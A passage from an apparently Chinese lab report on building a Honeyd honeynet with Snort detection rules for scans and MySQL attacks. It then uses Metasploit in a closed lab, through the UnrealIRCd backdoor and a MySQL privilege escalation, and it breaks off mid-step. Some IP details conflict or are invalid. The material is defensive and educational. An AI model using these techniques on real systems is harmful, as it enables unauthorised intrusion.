class="built_in">echo</span> -e <span class="string">&quot;<span class="variable">$VERSION</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">read</span> name; <span class="keyword">do</span></span><br><span class="line">	<span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$name</span>&quot;</span> &gt;&gt; <span class="variable">$LOG</span></span><br><span class="line">	LINE=`<span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$name</span>&quot;</span> | egrep -i <span class="string">&quot;[\n ]&quot;</span>`</span><br><span class="line">	<span class="keyword">if</span> [ -z <span class="string">&quot;<span class="variable">$LINE</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">		<span class="built_in">echo</span> <span class="string">&quot;Protocol mismatch.&quot;</span></span><br><span class="line">		my_stop	</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$name</span>&quot;</span></span><br><span class="line">	<span class="keyword">fi</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line">my_stop</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>web.sh</code></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">REQUEST=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">read</span> name</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">	LINE=`<span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$name</span>&quot;</span> | egrep -i <span class="string">&quot;[a-z:]&quot;</span>`</span><br><span class="line">	<span class="keyword">if</span> [ -z <span class="string">&quot;<span class="variable">$LINE</span>&quot;</span> ]</span><br><span class="line">	<span class="keyword">then</span></span><br><span class="line">		<span class="built_in">break</span></span><br><span class="line">	<span class="keyword">fi</span></span><br><span class="line">	<span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$name</span>&quot;</span> &gt;&gt; /tmp/log</span><br><span class="line">	NEWREQUEST=`<span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$name</span>&quot;</span> | grep <span class="string">&quot;GET .scripts.*cmd.exe.*dir.* HTTP/1.0&quot;</span>`</span><br><span class="line">	<span class="keyword">if</span> [ ! -z <span class="string">&quot;<span class="variable">$NEWREQUEST</span>&quot;</span> ] ; <span class="keyword">then</span></span><br><span class="line">		REQUEST=<span class="variable">$NEWREQUEST</span></span><br><span class="line">	<span class="keyword">fi</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ -z <span class="string">&quot;<span class="variable">$REQUEST</span>&quot;</span> ] ; <span class="keyword">then</span></span><br><span class="line">	<span class="built_in">cat</span> &lt;&lt; <span class="string">_eof_</span></span><br><span class="line"><span class="string">HTTP/1.1 404 NOT FOUND</span></span><br><span class="line"><span class="string">Server: Microsoft-IIS/5.0</span></span><br><span class="line"><span class="string">P3P: CP=&#x27;ALL IND DSP COR ADM CONo CUR CUSo IVAo IVDo PSA PSD TAI TELo OUR SAMo CNT COM INT NAV ONL PHY PRE PUR UNI&#x27;</span></span><br><span class="line"><span class="string">Content-Location: http://cpmsftwbw27/default.htm</span></span><br><span class="line"><span class="string">Date: Thu, 04 Apr 2002 06:42:18 GMT</span></span><br><span class="line"><span class="string">Content-Type: text/html</span></span><br><span class="line"><span class="string">Accept-Ranges: bytes</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;html&gt;&lt;title&gt;You are in Error&lt;/title&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">&lt;h1&gt;You are in Error&lt;/h1&gt;</span></span><br><span class="line"><span class="string">O strange and inconceivable thing! We did not really die, we were not really buried, we were not really crucified and raised again, but our imitation was but a figure, while our salvation is in reality. Christ was actually crucified, and actually buried, and truly rose again; and all these things have been vouchsafed to us, that we, by imitation communicating in His sufferings, might gain salvation in reality. O surpassing loving-kindness! Christ received the nails in His undefiled hands and feet, and endured anguish; while to me without suffering or toil, by the fellowship of His pain He vouchsafed salvation.</span></span><br><span class="line"><span class="string">&lt;p&gt;</span></span><br><span class="line"><span class="string">St. Cyril of Jerusalem, On the Christian Sacraments.</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">_eof_</span></span><br><span class="line">	<span class="built_in">exit</span> 0</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">DATE=`<span class="built_in">date</span>`</span><br><span class="line"><span class="built_in">cat</span> &lt;&lt; <span class="string">_eof_</span></span><br><span class="line"><span class="string">HTTP/1.0 200 OK</span></span><br><span class="line"><span class="string">Date: $DATE</span></span><br><span class="line"><span class="string">Server: Microsoft-IIS/5.0</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string">Content-Type: text/plain</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> Volume in drive C is Webserver      </span></span><br><span class="line"><span class="string"> Volume Serial Number is 3421-07F5</span></span><br><span class="line"><span class="string"> Directory of C:\inetpub</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">01-20-02   3:58a      &lt;DIR&gt;          .</span></span><br><span class="line"><span class="string">08-21-01   9:12a      &lt;DIR&gt;          ..</span></span><br><span class="line"><span class="string">08-21-01  11:28a      &lt;DIR&gt;          AdminScripts</span></span><br><span class="line"><span class="string">08-21-01   6:43p      &lt;DIR&gt;          ftproot</span></span><br><span class="line"><span class="string">07-09-00  12:04a      &lt;DIR&gt;          iissamples</span></span><br><span class="line"><span class="string">07-03-00   2:09a      &lt;DIR&gt;          mailroot</span></span><br><span class="line"><span class="string">07-16-00   3:49p      &lt;DIR&gt;          Scripts</span></span><br><span class="line"><span class="string">07-09-00   3:10p      &lt;DIR&gt;          webpub</span></span><br><span class="line"><span class="string">07-16-00   4:43p      &lt;DIR&gt;          wwwroot</span></span><br><span class="line"><span class="string">             0 file(s)              0 bytes</span></span><br><span class="line"><span class="string">            20 dir(s)     290,897,920 bytes free</span></span><br><span class="line"><span class="string">_eof_</span></span><br></pre></td></tr></table></figure>

<p><code>router.pl</code></p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/perl</span></span><br><span class="line"><span class="comment"># Copyright 2002 Niels Provos &lt;provos@citi.umich.edu&gt;</span></span><br><span class="line"><span class="comment"># All rights reserved.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># For the license refer to the main source code of Honeyd.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Don&#x27;t echo Will Echo Will Surpress Go Ahead</span></span><br><span class="line">$return = <span class="keyword">pack</span>(<span class="string">&#x27;ccccccccc&#x27;</span>, <span class="number">255</span>, <span class="number">254</span>, <span class="number">1</span>, <span class="number">255</span>, <span class="number">251</span>, <span class="number">1</span>, <span class="number">255</span>, <span class="number">251</span>, <span class="number">3</span>);</span><br><span class="line"><span class="keyword">syswrite</span> STDOUT, $return,<span class="number">9</span>;</span><br><span class="line"></span><br><span class="line">$count = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> ($count &lt; <span class="number">3</span>) &#123;</span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">    $count++;</span><br><span class="line">    <span class="keyword">syswrite</span> STDOUT, <span class="string">&quot;\r\n&quot;</span>;</span><br><span class="line">    $word = read_word(<span class="string">&quot;Username: &quot;</span>, <span class="number">1</span>);</span><br><span class="line">  &#125; <span class="keyword">while</span> (!$word &amp;&amp; $count &lt; <span class="number">3</span>);</span><br><span class="line">  <span class="keyword">if</span> ($count &gt;= <span class="number">3</span> &amp;&amp; !$word) &#123;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  $password = read_word(<span class="string">&quot;Password: &quot;</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (!$password) &#123;</span><br><span class="line">    <span class="keyword">syswrite</span> STDOUT, <span class="string">&quot;% Login invalid\r\n&quot;</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">syswrite</span> STDERR, <span class="string">&quot;Attempted login: $word/$password&quot;</span>;</span><br><span class="line">    <span class="keyword">syswrite</span> STDOUT, <span class="string">&quot;% Access denied\r\n&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">sub</span> <span class="title">read_word</span> </span>&#123;</span><br><span class="line">  <span class="keyword">local</span> $prompt = <span class="keyword">shift</span>;</span><br><span class="line">  <span class="keyword">local</span> $echo = <span class="keyword">shift</span>;</span><br><span class="line">  <span class="keyword">local</span> $word;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">syswrite</span> STDOUT, <span class="string">&quot;$prompt&quot;</span>;</span><br><span class="line"></span><br><span class="line">  $word = <span class="string">&quot;&quot;</span>;</span><br><span class="line">  $alarmed = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">eval</span> &#123;</span><br><span class="line">    <span class="keyword">local</span> $SIG<span class="string">&#123;ALRM&#125;</span> = <span class="function"><span class="keyword">sub</span> </span>&#123; $alarmed = <span class="number">1</span>; <span class="keyword">die</span>; &#125;;</span><br><span class="line">    <span class="keyword">alarm</span> <span class="number">30</span>;</span><br><span class="line">    $finished = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">      $nread = <span class="keyword">sysread</span> STDIN, $buffer, <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">die</span> <span class="keyword">unless</span> $nread;</span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">ord</span>($buffer) == <span class="number">0</span>) &#123;</span><br><span class="line">	; <span class="comment">#ignore</span></span><br><span class="line">      &#125; <span class="keyword">elsif</span> (<span class="keyword">ord</span>($buffer) == <span class="number">255</span>) &#123;</span><br><span class="line">	<span class="keyword">sysread</span> STDIN, $buffer, <span class="number">2</span>;</span><br><span class="line">      &#125; <span class="keyword">elsif</span> (<span class="keyword">ord</span>($buffer) == <span class="number">13</span> || <span class="keyword">ord</span>($buffer) == <span class="number">10</span>) &#123;</span><br><span class="line">	<span class="keyword">syswrite</span> STDOUT, <span class="string">&quot;\r\n&quot;</span> <span class="keyword">if</span> $echo;</span><br><span class="line">	$finished = <span class="number">1</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="keyword">syswrite</span> STDOUT, $buffer, <span class="number">1</span> <span class="keyword">if</span> $echo;</span><br><span class="line">	$word = $word.$buffer;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">while</span> (!$finished);</span><br><span class="line">    <span class="keyword">alarm</span> <span class="number">0</span>;</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="comment">#syswrite STDOUT, &quot;\r\n&quot; if $alarmed || ! $echo;</span></span><br><span class="line">  <span class="comment">#if ($alarmed) &#123;</span></span><br><span class="line">   <span class="comment"># syswrite STDOUT, &quot;% $prompt timeout expired!\r\n&quot;;</span></span><br><span class="line">    <span class="comment">#return (0);</span></span><br><span class="line">  <span class="comment">#&#125;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> ($word);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="启动Honeyd"><a href="#启动Honeyd" class="headerlink" title="启动Honeyd"></a>启动<code>Honeyd</code></h2><p>命令行输入命令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">arpd 192.168.43.152/29</span><br><span class="line">honeyd -f honeyd.conf -d -l /var/log/honeyd/honeyd.log -s /var/log/honeyd/service.log --fix-webserver-permissions 192.168.43.152/29</span><br></pre></td></tr></table></figure>

<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565764175954.png" alt="1565764175954"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565764181622.png" alt="1565764181622"></p>
<h2 id="检查honeyd搭建情况"><a href="#检查honeyd搭建情况" class="headerlink" title="检查honeyd搭建情况"></a>检查<code>honeyd</code>搭建情况</h2><ol>
<li><p><code>telnet</code>连接</p>
<p>kali使用<code>telnet</code>命令，连接<code>192.168.43.157</code>，观察日志文件和连接结果。</p>
<p>输入命令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">telnet 192.168.43.157</span><br></pre></td></tr></table></figure>

<p>检测与IP地址为<code>192.168.43.157</code>的<code>telnet连接</code>是否成功。结果如下图所示，连接成功，但因为不知道用户名和密码，输入三次用户名和密码后直接退出。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565764325222.png" alt="1565764325222"></p>
<p>日志文件如下，可以查看输入的用户名和密码</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565764345368.png" alt="1565764345368"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565764350258.png" alt="1565764350258"></p>
</li>
<li><p><code>ssh</code>连接</p>
<p>使用<code>ssh命令</code>，连接<code>192.168.43.155</code>观察日志文件和连接结果。</p>
<p>输入命令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh 192.168.43.155</span><br></pre></td></tr></table></figure>

<p>检测<code>ssh连接</code>是否有效，结果如下，与<code>ssh.sh</code>配置文件符合</p>
</li>
<li><p><code>web</code>运行</p>
<p>在浏览器输入URL:<code>192.168.43.155</code>，检测<code>web</code>是否运行</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565764466896.png" alt="1565764466896"></p>
<p>在网页中输入用户名和密码后点击登录跳转到网页如下，与<code>web.sh</code>配置文件相符合</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565764498045.png" alt="1565764498045"></p>
<p>查看<code>honeyd</code>日志文件，成功运行<code>web.sh</code>的脚本</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565764543952.png" alt="1565764543952"></p>
<p>如下所示，从<code>192.168.43.195</code>的<code>52304</code>端口访问了<code>192.168.43.155</code>的<code>80</code>端口</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565764549209.png" alt="1565764549209"></p>
</li>
</ol>
<h1 id="部署漏洞虚拟机"><a href="#部署漏洞虚拟机" class="headerlink" title="部署漏洞虚拟机"></a>部署漏洞虚拟机</h1><ol>
<li><code>永恒之蓝</code>漏洞，操作系统为win7家庭版虚拟机，ip地址为<code>192.168.43.59</code></li>
<li><code>CVE-2012-5613</code>，部署在<code>win xp</code>上的<code>mysql5.5.19</code>版本的权限提升漏洞，ip地址为<code>192.168.43.213</code></li>
<li><code>metasploitable2</code>虚拟机，一个特别制作的<code>ubuntu</code>操作系统，本身设计作为安全工具测试和演示常见漏洞攻击。默认只开启一个网络适配器并且开启<code>NAT</code>和<code>Host-only</code>，该虚拟机的ip为<code>192.168.43.120</code></li>
</ol>
<h1 id="在Honeyd虚拟机中安装配置Snort"><a href="#在Honeyd虚拟机中安装配置Snort" class="headerlink" title="在Honeyd虚拟机中安装配置Snort"></a>在<code>Honeyd</code>虚拟机中安装配置<code>Snort</code></h1><h2 id="Snor简介"><a href="#Snor简介" class="headerlink" title="Snor简介"></a><code>Snor</code>简介</h2><p>​        <code>Snort</code>是1998年用C语言开发的开源的入侵检测系统。直至今天，<code>Snort</code>已发展成为一个具有多平台(<code>Multi-Platform</code>)、实时(<code>Real-Time</code>)流量分析、网络IP数据包(<code>Pocket</code>)记录等特性的强大的网络入侵检测/防御系统(<code>Network Intrusion Detection/Prevention System</code>)，即<code>NIDS/NIPS</code>。<code>Snort</code>符合通用公共许可(<code>GPL——GNU General Pubic License</code>)，在网上可以通过免费下载获得<code>Snort</code>。</p>
<p>​        由于<code>Snort混杂模式</code>可以抓取网段中的所有数据包，<code>snort</code>部署在同一子网下的<code>win7</code>虚拟机上。</p>
<h2 id="local-rules配置"><a href="#local-rules配置" class="headerlink" title="local.rules配置"></a><code>local.rules</code>配置</h2><p>对尝试对密网中每个主机的访问写入类似如下告警规则：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">alert tcp any any -&gt; 192.168.43.153 any (msg:&quot;TCP detected&quot;; sid:1000004; rev:12;)</span><br></pre></td></tr></table></figure>

<p>检测对所有蜜罐虚拟主机和漏洞虚拟机的访问，并产生告警：<code>TCP detected</code>。</p>
<p>对<code>Sqlmap</code>, <code>WebInspect</code>, <code>Netsparker</code>, <code>Appscan</code>, <code>Nmap</code>, <code>Awvscan</code>的扫描写入告警规则。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565765754290.png" alt="1565765754290"></p>
<p>经过反复实验后，又修改了NMAP检测规则：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">alert icmp any any -&gt; 192.168.43.0/24 any (msg: &quot;NMAP ping sweep Scan&quot;; dsize:0;sid:10000004; rev: 1;)</span><br></pre></td></tr></table></figure>

<h2 id="mysql-rules配置"><a href="#mysql-rules配置" class="headerlink" title="mysql.rules配置"></a><code>mysql.rules</code>配置</h2><p>对<code>3306</code>的<code>sql攻击</code>写入如下告警规则</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">alert tcp any any -&gt; 192.168.43.128/25 3306 (msg:&quot;MYSQL root login attempt&quot;; flow:to_server,established; content:&quot;|0A 00 00 01 85 04 00 00 80|root|00|&quot;; metadata:service mysql; classtype:protocol-command-decode; sid:1775; rev:3;)</span><br><span class="line">alert tcp any any -&gt; 192.168.43.128/25 3306 (msg:&quot;MYSQL show databases attempt&quot;; flow:to_server,established; content:&quot;|0F 00 00 00 03|show databases&quot;; metadata:service mysql; classtype:protocol-command-decode; sid:1776; rev:3;)</span><br><span class="line">alert tcp any any -&gt; 192.168.43.128/25 3306 (msg:&quot;MYSQL 4.0 root login attempt&quot;; flow:to_server,established; content:&quot;|01|&quot;; depth:1; offset:3; content:&quot;root|00|&quot;; within:5; distance:5; nocase; metadata:service mysql; classtype:protocol-command-decode; sid:3456; rev:4;)</span><br><span class="line">alert tcp any any -&gt; 192.168.43.128/25 3306 (msg:&quot;MYSQL CREATE FUNCTION attempt&quot;; flow:to_server,established; content:&quot;|03|create&quot;; offset:4; nocase; pcre:&quot;/\x03create\s+(aggregate\s+)*function/smi&quot;; metadata:service mysql; reference:bugtraq,12781; reference:cve,2005-0709; classtype:misc-activity; sid:3528; rev:3;)</span><br><span class="line">alert tcp any 3306 -&gt; 192.168.43.128/25 any (msg:&quot;MYSQL server greeting&quot;; flow:from_server,established; content:&quot;|00|&quot;; depth:1; offset:3; flowbits:set,mysql.server_greeting; flowbits:noalert; metadata:policy balanced-ips drop, policy connectivity-ips drop, policy security-ips drop, service mysql; reference:bugtraq,10655; reference:cve,2004-0627; reference:nessus,12639; reference:url,www.nextgenss.com/advisories/mysql-authbypass.txt; classtype:attempted-user; sid:3665; rev:6;)</span><br><span class="line">alert tcp any any -&gt; 192.168.43.128/25 3306 (msg:&quot;MYSQL protocol 41 secure client overflow attempt&quot;; flow:to_server,established; flowbits:isset,mysql.server_greeting; content:&quot;|01|&quot;; depth:1; offset:3; byte_test:1,&amp;,0x80,4; byte_test:1,&amp;,0x02,4; content:&quot;|00 14|&quot;; offset:36; isdataat:74,relative; content:!&quot;|00|&quot;; within:74; metadata:policy balanced-ips drop, policy connectivity-ips drop, policy security-ips drop, service mysql; reference:bugtraq,10655; reference:cve,2004-0627; reference:nessus,12639; reference:url,www.nextgenss.com/advisories/mysql-authbypass.txt; classtype:misc-attack; sid:3669; rev:6;)</span><br><span class="line">alert tcp any any -&gt; 192.168.43.128/25 3306 (msg:&quot;MYSQL client authentication bypass attempt&quot;; flow:to_server,established; flowbits:isset,mysql.server_greeting; content:&quot;|01|&quot;; depth:1; offset:3; byte_test:1,&amp;,0x80,4; byte_test:1,!&amp;,0x02,4; content:&quot;|00 14 00|&quot;; offset:9; metadata:policy balanced-ips drop, policy connectivity-ips drop, policy security-ips drop, service mysql; reference:bugtraq,10655; reference:cve,2004-0627; reference:nessus,12639; reference:url,www.nextgenss.com/advisories/mysql-authbypass.txt; classtype:misc-attack; sid:3668; rev:8;)</span><br><span class="line">alert tcp any any -&gt; 192.168.43.128/25 3306 (msg:&quot;MYSQL client overflow attempt&quot;; flow:to_server,established; flowbits:isset,mysql.server_greeting; content:&quot;|01|&quot;; depth:1; offset:3; byte_test:1,!&amp;,0x80,4; byte_test:1,!&amp;,0x02,4; content:&quot;|00|&quot;; offset:9; isdataat:74,relative; content:!&quot;|00|&quot;; within:74; metadata:policy balanced-ips drop, policy connectivity-ips drop, policy security-ips drop, service mysql; reference:bugtraq,10655; reference:cve,2004-0627; reference:nessus,12639; reference:url,www.nextgenss.com/advisories/mysql-authbypass.txt; classtype:misc-attack; sid:3672; rev:6;)</span><br><span class="line">alert tcp any any -&gt; 192.168.43.128/25 3306 (msg:&quot;MYSQL secure client overflow attempt&quot;; flow:to_server,established; flowbits:isset,mysql.server_greeting; content:&quot;|01|&quot;; depth:1; offset:3; byte_test:1,&amp;,0x80,4; byte_test:1,!&amp;,0x02,4; content:&quot;|00 14|&quot;; offset:9; isdataat:74,relative; content:!&quot;|00|&quot;; within:74; metadata:policy balanced-ips drop, policy connectivity-ips drop, policy security-ips drop, service mysql; reference:bugtraq,10655; reference:cve,2004-0627; reference:nessus,12639; reference:url,www.nextgenss.com/advisories/mysql-authbypass.txt; classtype:misc-attack; sid:3670; rev:6;)</span><br><span class="line">alert tcp any any -&gt; 192.168.43.128/25 3306 (msg:&quot;MYSQL protocol 41 client authentication bypass attempt&quot;; flow:to_server,established; flowbits:isset,mysql.server_greeting; content:&quot;|01|&quot;; depth:1; offset:3; byte_test:1,&amp;,0x80,4; byte_test:1,&amp;,0x02,4; content:&quot;|00 14 00|&quot;; offset:36; metadata:policy connectivity-ips drop, policy security-ips drop, service mysql; reference:bugtraq,10655; reference:cve,2004-0627; reference:nessus,12639; reference:url,www.nextgenss.com/advisories/mysql-authbypass.txt; classtype:misc-attack; sid:3667; rev:6;)</span><br><span class="line">alert tcp any any -&gt; 192.168.43.128/25 3306 (msg:&quot;MYSQL protocol 41 client overflow attempt&quot;; flow:to_server,established; flowbits:isset,mysql.server_greeting; content:&quot;|01|&quot;; depth:1; offset:3; byte_test:1,!&amp;,0x80,4; byte_test:1,&amp;,0x02,4; content:&quot;|00|&quot;; offset:36; isdataat:74,relative; content:!&quot;|00|&quot;; within:74; metadata:policy balanced-ips drop, policy connectivity-ips drop, policy security-ips drop, service mysql; reference:bugtraq,10655; reference:cve,2004-0627; reference:nessus,12639; reference:url,www.nextgenss.com/advisories/mysql-authbypass.txt; classtype:misc-attack; sid:3671; rev:6;)</span><br><span class="line">alert tcp $SQL_SERVERS 3306 -&gt; $EXTERNAL_NET any (msg:&quot;MYSQL server greeting finished&quot;; flow:from_server,established; byte_test:1,&gt;,0,3; flowbits:isset,mysql.server_greeting; flowbits:unset,mysql.server_greeting; flowbits:noalert; metadata:policy balanced-ips drop, policy connectivity-ips drop, policy security-ips drop, service mysql; reference:bugtraq,10655; reference:cve,2004-0627; reference:nessus,12639; reference:url,www.nextgenss.com/advisories/mysql-authbypass.txt; classtype:attempted-user; sid:3666; rev:8;)</span><br><span class="line">alert tcp $EXTERNAL_NET any -&gt; $SQL_SERVERS 3306 (msg:&quot;MYSQL CREATE FUNCTION buffer overflow attempt&quot;; flow:to_server,established; content:&quot;|03|create&quot;; offset:4; nocase; pcre:&quot;/\x03create\s+(aggregate\s+)*function\s+\S&#123;50&#125;/smi&quot;; metadata:service mysql; reference:bugtraq,14509; reference:cve,2005-2558; classtype:misc-activity; sid:4649; rev:2;)</span><br><span class="line">alert tcp $EXTERNAL_NET any -&gt; $SQL_SERVERS 3306 (msg:&quot;MYSQL Date_Format denial of service attempt&quot;; flow:to_server,established; content:&quot;DATE_FORMAT&quot;; pcre:&quot;/DATE_FORMAT\x28\s*(\x22[^\x22]+\x25[^\x22]*\x22|\x27[^\x27]+\x25[^\x27]*\x27)/smi&quot;; metadata:service mysql; reference:bugtraq,19032; reference:cve,2006-3469; reference:url,dev.mysql.com/doc/refman/5.0/en/news-5-0-21.html; classtype:attempted-dos; sid:8057; rev:2;)</span><br></pre></td></tr></table></figure>

<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565765815890.png" alt="1565765815890"></p>
<p>检测<code>root login</code>, <code>show databases</code>, <code>create function</code>, <code>secure client overflow</code>等等攻击尝试，并产生对应的告警信息。</p>
<h2 id="snort-conf配置"><a href="#snort-conf配置" class="headerlink" title="snort.conf配置"></a><code>snort.conf</code>配置</h2><p>设置<code>output database</code>，记录所有<code>alert</code>和<code>log</code>文件到数据库</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565766059427.png" alt="1565766059427"></p>
<p>并记录日志文件到数据库，可以从网站打开查看日志。</p>
<h2 id="snort其他组件"><a href="#snort其他组件" class="headerlink" title="snort其他组件"></a><code>snort</code>其他组件</h2><p>安装<code>adobd</code>、<code>jgraph</code>、<code>acid</code>（网页文件）组件。</p>
<p>配置<code>Acid</code>网页配置文件<code>acid_conf.php</code>，使其与<code>mysql</code>数据库匹配，并能输出日志和告警到网页端。</p>
<p>浏览器输入<code>http://localhost/acid/acid_db_setup.php</code>，初始化数据库。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565766150653.png" alt="1565766150653"></p>
<h1 id="网络靶场攻击与检测"><a href="#网络靶场攻击与检测" class="headerlink" title="网络靶场攻击与检测"></a>网络靶场攻击与检测</h1><h2 id="靶场扫描检测"><a href="#靶场扫描检测" class="headerlink" title="靶场扫描检测"></a>靶场扫描检测</h2><h3 id="局域网设置"><a href="#局域网设置" class="headerlink" title="局域网设置"></a>局域网设置</h3><p><code>攻击机</code>和<code>靶机</code>、<code>snort</code>在同一局域网下。攻击机kali的ip地址为<code>192.168.43.257</code></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565766422794.png" alt="1565766422794"></p>
<p>据此可知子网为<code>192.168.43.0/24</code></p>
<h3 id="攻击机nmap扫描局域网"><a href="#攻击机nmap扫描局域网" class="headerlink" title="攻击机nmap扫描局域网"></a>攻击机<code>nmap</code>扫描局域网</h3><p>攻击机<code>nmap</code>扫描<code>192.168.43.0/24</code>网段，发现该网段下共<code>19</code>台主机，其中图中MAC地址相同的主机为<code>honeyd</code>搭建的拓扑结构里面的虚拟主机，而不是此MAC地址的机器为具有漏洞的真实虚拟机。可见honeyd的MAC地址为<code>62:44:42:89:7D:46</code></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565766497207.png" alt="1565766497207"></p>
<p>第一次扫描后honeyd的日志</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565766512229.png" alt="1565766512229"></p>
<h2 id="攻击漏洞虚拟机"><a href="#攻击漏洞虚拟机" class="headerlink" title="攻击漏洞虚拟机"></a>攻击漏洞虚拟机</h2><h3 id="对metasploitable2漏洞虚拟机攻击"><a href="#对metasploitable2漏洞虚拟机攻击" class="headerlink" title="对metasploitable2漏洞虚拟机攻击"></a>对<code>metasploitable2</code>漏洞虚拟机攻击</h3><p><code>metasploitable2</code>的ip地址为<code>192.168.32.120</code>，首先对<code>6667</code>端口使用<code>unreal_ircd_3281_backdoor</code>模块，即<code>irc_3281_backdoor</code>漏洞。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565766748326.png" alt="1565766748326"></p>
<p>成功植入后门，<code>getshell</code>:</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565766767823.png" alt="1565766767823"></p>
<p>攻击机端控制漏洞机<code>192.168.43.12</code>0后，在根目录下执行命令：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir 77777777777777777</span><br></pre></td></tr></table></figure>

<p>创建了新目录</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565766807924.png" alt="1565766807924"></p>
<p>在漏洞机可以看到已经被写入：</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565766822946.png" alt="1565766822946"></p>
<h3 id="对-win-xp-漏洞机攻击"><a href="#对-win-xp-漏洞机攻击" class="headerlink" title="对 win xp 漏洞机攻击"></a>对 <code>win xp</code> 漏洞机攻击</h3><ol>
<li><p>对局域网中第二个主机<code>192.168.43.59</code>检测端口，发现<code>3306</code>端口打开，由此推测存在<code>mysql</code>服务漏洞，随后检测<code>mysql版本</code></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565766888821.png" alt="1565766888821"></p>
</li>
<li><p>扫描到<code>3306</code>端口开放后，使用<code>mysql_version</code>模块检测<code>mysql版本</code>，检测到是<code>5.5.19版本</code>，存在提权漏洞<code>CVE-2012-5613</code></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565766949919.png" alt="1565766949919"></p>
</li>
<li><p><code>Metasploit</code>拥有如下模块，使用<code>mysql</code>中的<code>mysql_mof</code>对目标主机进行本地提权</p>
